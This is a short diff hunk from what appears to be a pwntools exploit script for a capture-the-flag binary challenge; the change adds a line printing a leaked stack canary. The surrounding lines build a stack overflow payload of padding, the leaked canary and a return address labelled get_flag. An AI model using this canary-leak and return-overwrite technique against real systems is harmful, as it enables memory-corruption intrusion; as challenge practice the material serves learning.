@@ -9,6 +9,7 @@ conn.sendline(send)
 # print(f"Send #1 {send}")
 fetc = conn.recvline()
 bfore = b'\x00' * 24  # b'a' * 16 + p64(0x00007fffffffdec0)  # 8 * 3
+print(f"The canari is: {int(fetc)}")
 canari = p64(int(fetc))
 after = b'\x00'*8 # p64(0x0)
 get_flag = p64(0x4007f7)
